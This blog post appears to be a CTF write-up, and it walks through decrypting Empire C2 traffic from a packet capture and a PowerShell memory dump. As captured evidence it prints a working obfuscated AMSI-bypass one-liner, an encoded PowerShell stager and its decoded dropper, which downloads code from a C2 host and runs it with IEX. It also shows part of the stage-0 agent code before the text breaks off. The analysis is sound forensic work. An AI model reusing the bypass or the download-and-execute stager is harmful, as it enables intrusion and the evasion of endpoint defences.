        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://connar.github.io/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://connar.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://connar.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://connar.github.io/mychallenges/" title="My Challenges">
                    <span>My Challenges</span>
                </a>
            </li>
            <li>
                <a href="https://connar.github.io/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://connar.github.io/projects/" title="Projects">
                    <span>Projects</span>
                </a>
            </li>
            <li>
                <a href="https://connar.github.io/training/" title="Training">
                    <span>Training</span>
                </a>
            </li>
            <li>
                <a href="https://connar.github.io/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://connar.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://connar.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://connar.github.io/ctfwriteups/">Ctfwriteups</a></div>
    <h1 class="post-title entry-hint-parent">
      Empire is at Risk - Writeup
    </h1>
    <div class="post-meta">15 min&nbsp;·&nbsp;connar

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#intro" aria-label="Intro">Intro</a></li>
                <li>
                    <a href="#reference-material-to-solve-the-challenge" aria-label="Reference material to solve the challenge">Reference material to solve the challenge</a></li>
                <li>
                    <a href="#getting-the-rc4-key" aria-label="Getting the RC4 key">Getting the RC4 key</a></li>
                <li>
                    <a href="#stage-0" aria-label="Stage 0">Stage 0</a></li>
                <li>
                    <a href="#stage-1" aria-label="Stage 1">Stage 1</a><ul>
                        
                <li>
                    <a href="#stage-1---aes-decryption-to-get-rsa-pubkey" aria-label="Stage 1 - AES decryption to get RSA PubKey">Stage 1 - AES decryption to get RSA PubKey</a></li>
                <li>
                    <a href="#stage-1---extracting-rsa-privkey-from-minidump" aria-label="Stage 1 - Extracting RSA PrivKey from minidump">Stage 1 - Extracting RSA PrivKey from minidump</a></li>
                <li>
                    <a href="#stage-1---rsa-decryption-to-get-empires-nonce-and-sessionkey" aria-label="Stage 1 - RSA decryption to get Empire&rsquo;s nonce and SessionKey">Stage 1 - RSA decryption to get Empire&rsquo;s nonce and SessionKey</a></li></ul>
                </li>
                <li>
                    <a href="#stage-2---decrypting-rest-of-the-packets" aria-label="Stage 2 - Decrypting rest of the packets">Stage 2 - Decrypting rest of the packets</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="intro">Intro<a hidden class="anchor" aria-hidden="true" href="#intro">#</a></h1>
<p>In this challenge we are given:</p>
<blockquote>
    <p>A pcap file (capture.pcap)</p>
    <p>A powershell dump (powershell.DMP)</p>
</blockquote>
<p>A lot of times hard difficulty challenges are related to C2 traffic, and in this challenge we are given a pcap file that indicates there is a chance this might be the case. Simply searching for <code>Empire C2</code> (Empire from the title of the challenge) will yield results related to an Empire C2 Framework.</p>
<h1 id="reference-material-to-solve-the-challenge">Reference material to solve the challenge<a hidden class="anchor" aria-hidden="true" href="#reference-material-to-solve-the-challenge">#</a></h1>
<p>Navigating through some posts, a very good one that I used as a reference while solving the challenge was:</p>
<ul>
<li><code>https://www.keysight.com/blogs/en/tech/nwvs/2021/06/16/empire-c2-networking-into-the-dark-side</code></li>
</ul>
<p>This post showcases how to decrypt traffic step by step and the similarities between this post and the challenge are plenty, which helped me a ton in the proccess of following it step by step. Quoted from the post:</p>
<pre tabindex="0"><code>STAGE 0 - First, the victim sends a GET beacon with a cookie in the HTTP headers, server replies with 200 OK with a big (~ 5.5 KB) encrypted payload.
STAGE 1 - The victim sends a POST message with an encrypted payload, to which server sends a 200 OK response with a small payload.
STAGE 2 - Finally, the victim sends another POST message, to which server replies with an even bigger (~ 41KB) payload.
</code></pre><p>I will show how to proceed to each step and gather all the required info to decrypt the traffic.</p>
<h1 id="getting-the-rc4-key">Getting the RC4 key<a hidden class="anchor" aria-hidden="true" href="#getting-the-rc4-key">#</a></h1>
<p>Before we head to STAGE 0, we need to find the dropper. Navigating through the first TCP streams, we will end up finding the following packet:</p>
<pre tabindex="0"><code>
PS C:\Windows\system32&gt; whoami
corp\satadministrator
PS C:\Windows\system32&gt; $MFmONzmHg=$null;$rfsbs=&#34;$((&#39;S&#39;+&#39;y&#39;+&#39;s&#39;+&#39;t&#39;+&#39;e&#39;+&#39;m&#39;).nORMALIZe([ChAR](70*52/52)+[CHAr](66+45)+[cHar]([byTe]0x72)+[chAr]([byte]0x6d)+[chAr](68*21/21)) -replace [CHaR](92*74/74)+[ChaR](112)+[chAR](123)+[cHaR](25+52)+[ChaR]([bYtE]0x6e)+[CHaR](18+107)).$([CHaR]([bYte]0x4d)+[chAr]([ByTe]0x61)+[cHAR]([ByTe]0x6e)+[cHaR](97)+[ChAr](103*89/89)+[CHar]([bytE]0x65)+[ChaR](17+92)+[cHaR]([BytE]0x65)+[char](51+59)+[cHaR](116+63-63)).$((&#39;..ut..m&#39;+&#39;..t....n&#39;).noRMAlIZE([cHar](17+53)+[chAr](111+5-5)+[ChaR](114+20-20)+[ChAR](109)+[CHar]([BYTe]0x44)) -replace [chaR]([bYtE]0x5c)+[cHAr](28+84)+[CHAr](123*58/58)+[CHar](77)+[char](55+55)+[ChAr](125+34-34)).$([ChAR](30+35)+[char](109+82-82)+[chaR]([ByTE]0x73)+[ChAr]([BYte]0x69)+[char]([BYTE]0x55)+[cHar](116+28-28)+[cHar](105)+[chaR](108)+[Char]([Byte]0x73))&#34;;$hn=&#34;+[cHAr]([ByTE]0x6d)+[cHaR]([BYtE]0x73)&#34;;[Threading.Thread]::Sleep(1801);[Delegate]::CreateDelegate((&#34;Func``3[String, $(([String].Assembly.GetType($([chAr]([BYTE]0x53)+[chAR](121*1/1)+[CHAr]([byte]0x73)+[char]([bYtE]0x74)+[cHaR]([BytE]0x65)+[ChaR](109+98-98)+[cHAR](46*36/36)+[CHAR](82)+[cHar](61+40)+[ChAr](102*7/7)+[cHAR](108+8-8)+[CHaR]([bYte]0x65)+[char]([ByTE]0x63)+[cHAR]([ByTE]0x74)+[ChAr](105)+[cHAR]([byTe]0x6f)+[chAr]([bytE]0x6e)+[CHaR](46*5/5)+[cHar]([bYte]0x42)+[CHar](105+78-78)+[ChAr]([BytE]0x6e)+[chAR]([BYTe]0x64)+[CHAR](31+74)+[cHaR](22+88)+[chAr]([BytE]0x67)+[cHAR]([BYtE]0x46)+[cHaR](108*18/18)+[ChAR]([byte]0x61)+[cHar]([BYTe]0x67)+[ChAR]([BytE]0x73)))).FullName), $((&#39;S&#39;+&#39;y&#39;+&#39;s&#39;+&#39;t&#39;+&#39;e&#39;+&#39;m&#39;).nORMALIZe([ChAR](70*52/52)+[CHAr](66+45)+[cHar]([byTe]0x72)+[chAr]([byte]0x6d)+[chAr](68*21/21)) -replace [CHaR](92*74/74)+[ChaR](112)+[chAR](123)+[cHaR](25+52)+[ChaR]([bYtE]0x6e)+[CHaR](18+107)).Reflection.FieldInfo]&#34; -as [String].Assembly.GetType($([CHAR]([BYtE]0x53)+[ChAr]([BYTE]0x79)+[cHAR]([BYte]0x73)+[ChAr]([BYTE]0x74)+[CHaR](101+5-5)+[ChaR]([BYTe]0x6d)+[ChAR](46)+[Char]([bYTe]0x54)+[Char]([byTe]0x79)+[chAR](12+100)+[char](101+27-27)))), [Object]([Ref].Assembly.GetType($rfsbs)),($((&#39;GetF..&#39;+&#39;eld&#39;).NOrMaLize([chaR](70)+[char]([byTe]0x6f)+[CHAR]([bYtE]0x72)+[CHAr](109)+[CHar]([BYtE]0x44)) -replace [CHAr](92+15-15)+[ChAR]([bYTe]0x70)+[CHAR](123*12/12)+[chAr]([bYTE]0x4d)+[cHar]([bYTE]0x6e)+[ChaR](125+14-14)))).Invoke($([ChAr]([ByTE]0x61)+[CHAr]([BYTe]0x6d)+[chAr](101+14)+[ChaR]([bytE]0x69)+[CHaR]([BYte]0x49)+[char](110+17-17)+[CHaR](105)+[CHAR]([bytE]0x74)+[chAr]([byte]0x46)+[chaR]([byTE]0x61)+[Char]([BytE]0x69)+[chAr](108)+[chAr]([BYTe]0x65)+[chAr]([BYtE]0x64)),((&#34;NonPublic,Static&#34;) -as [String].Assembly.GetType($([chAr]([BYTE]0x53)+[chAR](121*1/1)+[CHAr]([byte]0x73)+[char]([bYtE]0x74)+[cHaR]([BytE]0x65)+[ChaR](109+98-98)+[cHAR](46*36/36)+[CHAR](82)+[cHar](61+40)+[ChAr](102*7/7)+[cHAR](108+8-8)+[CHaR]([bYte]0x65)+[char]([ByTE]0x63)+[cHAR]([ByTE]0x74)+[ChAr](105)+[cHAR]([byTe]0x6f)+[chAr]([bytE]0x6e)+[CHaR](46*5/5)+[cHar]([bYte]0x42)+[CHar](105+78-78)+[ChAr]([BytE]0x6e)+[chAR]([BYTe]0x64)+[CHAR](31+74)+[cHaR](22+88)+[chAr]([BytE]0x67)+[cHAR]([BYtE]0x46)+[cHaR](108*18/18)+[ChAR]([byte]0x61)+[cHar]([BYTe]0x67)+[ChAR]([BytE]0x73))))).SetValue($MFmONzmHg,$True);
PS C:\Windows\system32&gt; powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQAzAEEARABjAEEATABnAEEAMwBBAEQAUQBBAEwAZwBBAHgAQQBEAGsAQQBPAEEAQQB1AEEARABVAEEATQBnAEEANgBBAEQAZwBBAE0AQQBBADQAQQBEAE0AQQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAGUAdwB0AFYAWgBpAE4AfgA1ACkAMQAzAEMAeAAuAE0AQABvAE8ASgB5AHAAXgBHAD4AVABSAFcAcQAoACMAYgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAUgBZAGIAZgBIAEEAPQBQAG0ATABzAG0AYwBSAGUAKwBRAC8AZwB6AEwAUQBiAEoAbQBOAG8ANgBxAEIARgBlAFgAZwA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
</code></pre><p>Decoding the second b64 data that are going to be executed as powershell code, we get our dropper:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">If</span> ($PSVersionTable.PSVersion.Major  - ge <span style="color:#ae81ff">3</span>)  {};
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.Net.ServicePointManager</span>]::Expect100Continue = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>$wc = New - Object System.Net.WebClient;
</span></span><span style="display:flex;"><span>$u = <span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;</span>;
</span></span><span style="display:flex;"><span>$ser = $([<span style="color:#66d9ef">Text.Encoding</span>]::Unicode.GetString([<span style="color:#66d9ef">Convert</span>]::FromBase64String(<span style="color:#e6db74">&#39;aAB0AHQAcAA6AC8ALwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADMA&#39;</span>)));
</span></span><span style="display:flex;"><span>$t = <span style="color:#e6db74">&#39;/news.php&#39;</span>;
</span></span><span style="display:flex;"><span>$wc.Headers.Add(<span style="color:#e6db74">&#39;User-Agent&#39;</span>, $u);
</span></span><span style="display:flex;"><span>$wc.Proxy = [<span style="color:#66d9ef">System.Net.WebRequest</span>]::DefaultWebProxy;
</span></span><span style="display:flex;"><span>$wc.Proxy.Credentials = [<span style="color:#66d9ef">System.Net.CredentialCache</span>]::DefaultNetworkCredentials;
</span></span><span style="display:flex;"><span>$Script:Proxy = $wc.Proxy;
</span></span><span style="display:flex;"><span>$K = [<span style="color:#66d9ef">System.Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#39;ewtVZiN~5)13Cx.M@oOJyp^G&gt;TRWq(#b&#39;</span>);
</span></span><span style="display:flex;"><span>$R = {
</span></span><span style="display:flex;"><span>    $D, $K = $Args;
</span></span><span style="display:flex;"><span>    $S = <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.255</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.255</span>|% {
</span></span><span style="display:flex;"><span>        $J = ($J + $S[$_] + $K[$_%$K.Count])<span style="color:#66d9ef">%</span><span style="color:#ae81ff">256</span>;
</span></span><span style="display:flex;"><span>        $S[$_], $S[$J] = $S[$J], $S[$_]
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    $D|% {
</span></span><span style="display:flex;"><span>        $I = ($I + <span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">%</span><span style="color:#ae81ff">256</span>;
</span></span><span style="display:flex;"><span>        $H = ($H + $S[$I])<span style="color:#66d9ef">%</span><span style="color:#ae81ff">256</span>;
</span></span><span style="display:flex;"><span>        $S[$I], $S[$H] = $S[$H], $S[$I];
</span></span><span style="display:flex;"><span>        $_ - bxor$S[($S[$I] + $S[$H])<span style="color:#66d9ef">%</span><span style="color:#ae81ff">256</span>]
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>$wc.Headers.Add(<span style="color:#e6db74">&#34;Cookie&#34;</span>, <span style="color:#e6db74">&#34;RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=&#34;</span>);
</span></span><span style="display:flex;"><span>$data = $wc.DownloadData($ser + $t);
</span></span><span style="display:flex;"><span>$iv = $data[<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.3</span>];
</span></span><span style="display:flex;"><span>$data = $data[<span style="color:#ae81ff">4</span>..$data.length];
</span></span><span style="display:flex;"><span> - join[<span style="color:#66d9ef">Char[]</span>](&amp; $R $data ($IV + $K))|IEX
</span></span></code></pre></div><p>This basically downloads the STAGE 0 from the ip:port hidden inside this base64 blob: <code>aAB0AHQAcAA6AC8ALwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADMA</code>.</p>
<p>The RC4 key it uses is: <code>ewtVZiN~5)13Cx.M@oOJyp^G&gt;TRWq(#b</code>.
It also sets a cookie encrypted with the same RC4 key: <code>PmLsmcRe+Q/gzLQbJmNo6qBFeXg=</code>. Before we proceed to decrypt our STAGE 0 payload, let&rsquo;s try to decrypt the cookie as the blog suggests (to make sure we have the correct key and way of decryption). Based on the blog, I made the following python script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ARC4
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ewtVZiN~5)13Cx.M@oOJyp^G&gt;TRWq(#b&#39;</span>
</span></span><span style="display:flex;"><span>enc_data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;PmLsmcRe+Q/gzLQbJmNo6qBFeXg=&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>encr_data <span style="color:#f92672">=</span> b64decode(enc_data)
</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> ARC4<span style="color:#f92672">.</span>new(encr_data[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msg <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(encr_data[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">19</span>])
</span></span><span style="display:flex;"><span>print(msg)
</span></span></code></pre></div><p>Running it, we get:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>└─$ python rc4_decrypt.py
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;00000000\x01\x01\x00\x00\x00\x00\x00&#39;</span>
</span></span></code></pre></div><p>which is the same as what the blog showcases, so we are in the right track! Basically, based on the blog:</p>
<pre tabindex="0"><code>+-----------+--------+--------+---------+---------+
| SessionID | Lang   | Meta   | Extra   | Length  |
+-----------|--------|--------|---------|---------|
| 8 bytes   | 1 byte | 1 byte | 2 bytes | 4 bytes |
+-----------|--------|--------|---------|-------- |
| 00000000  | 01     | 01     | 0000    | 0000    |
+-----------|--------|--------|---------|---------|
</code></pre><h1 id="stage-0">Stage 0<a hidden class="anchor" aria-hidden="true" href="#stage-0">#</a></h1>
<p>Great, now let&rsquo;s head to the response of the <code>GET /news.php</code> which contains the encrypted STAGE 0 code.</p>
<pre tabindex="0"><code>GET /news.php HTTP/1.1
Cookie: RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: 77.74.198.52:8083
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.9.13
Date: Tue, 30 Aug 2022 16:35:50 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 7409
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Server: Microsoft-IIS/7.5
Connection: close

.).J&lt;...%o...o(]......J.......[
y.O.^..6...........y.m...A...P.^J...bp:.
... ...
%...........f.7......=.O...H0;..0A.B.w.......N.r..[]l..b-.].W...........Y&gt;2Z......
2..V....!.....CN&amp;ZF.e......[L&#34;).&amp;.....m.....=.:....R.OKJx..=Y.....-.
Y...2.6cA.=....A...IC`.LUo..3.I\........`......U.......p
---more data---
</code></pre><p>We will modify our script to the following one for decryption:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ARC4
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ewtVZiN~5)13Cx.M@oOJyp^G&gt;TRWq(#b&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># If we choose &#34;Show data as Raw&#34; in Wireshark, we will get the following hex data stored in enc_data</span>
</span></span><span style="display:flex;"><span>enc_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1a29d64a3cb4ebaf...[more hex]&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>encr_data <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(enc_data)
</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> ARC4<span style="color:#f92672">.</span>new(encr_data[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msg <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(encr_data[<span style="color:#ae81ff">4</span>:])
</span></span><span style="display:flex;"><span>print(msg)
</span></span></code></pre></div><p>After running it, we get the decrypted STAGE 0 powershell code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>$server = <span style="color:#e6db74">&#34;http://77.74.198.52:8083&#34;</span>;
</span></span><span style="display:flex;"><span>$Script:ControlServers = @($server);
</span></span><span style="display:flex;"><span>$Script:ServerIndex = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($server.StartsWith(\<span style="color:#e6db74">&#39;https\&#39;</span>))  {
</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">System.Net.ServicePointManager</span>]::ServerCertificateValidationCallback = {
</span></span><span style="display:flex;"><span>        $true
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$Script:SendMessage = {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">param</span>($Packets)<span style="color:#66d9ef">if</span> ($Packets)  {
</span></span><span style="display:flex;"><span>        $EncBytes = Encrypt - Bytes $Packets;
</span></span><span style="display:flex;"><span>        $RoutingPacket = New - RoutingPacket  - EncData $EncBytes  - Meta <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($Script:ControlServers[$Script:ServerIndex].StartsWith(\<span style="color:#e6db74">&#39;http\&#39;</span>))  {
</span></span><span style="display:flex;"><span>            $wc = New - Object System.Net.WebClient;
</span></span><span style="display:flex;"><span>            $wc.Proxy = [<span style="color:#66d9ef">System.Net.WebRequest</span>]::GetSystemWebProxy();
</span></span><span style="display:flex;"><span>            $wc.Proxy.Credentials = [<span style="color:#66d9ef">System.Net.CredentialCache</span>]::DefaultCredentials;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($Script:Proxy)  {
</span></span><span style="display:flex;"><span>                $wc.Proxy = $Script:Proxy;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            $wc.Headers.Add(\<span style="color:#e6db74">&#39;User - Agent\&#39;</span>, $Script:UserAgent);
</span></span><span style="display:flex;"><span>            $Script:Headers.GetEnumerator() | <span style="color:#66d9ef">ForEach</span> - Object {
</span></span><span style="display:flex;"><span>                $wc.Headers.Add($_.Name, $_.Value)
</span></span><span style="display:flex;"><span>            };
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                $taskURI = $Script:TaskURIs | Get - Random;
</span></span><span style="display:flex;"><span>                $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, \<span style="color:#e6db74">&#39;POST\&#39;</span>, $RoutingPacket);
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> [<span style="color:#66d9ef">System.Net.WebException</span>] {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> ($_.Exception.GetBaseException().Response.statuscode  - eq <span style="color:#ae81ff">401</span>)  {
</span></span><span style="display:flex;"><span>                    Start - Negotiate  - S <span style="color:#e6db74">&#34;</span>$ser<span style="color:#e6db74">&#34;</span>  - SK $SK  - UA $ua;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>$Script:GetTask = {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($Script:ControlServers[$Script:ServerIndex].StartsWith(<span style="color:#e6db74">&#34;http&#34;</span>))  {
</span></span><span style="display:flex;"><span>            $RoutingPacket = New - RoutingPacket  - EncData $Null  - Meta <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>            $RoutingCookie = [<span style="color:#66d9ef">Convert</span>]::ToBase64String($RoutingPacket);
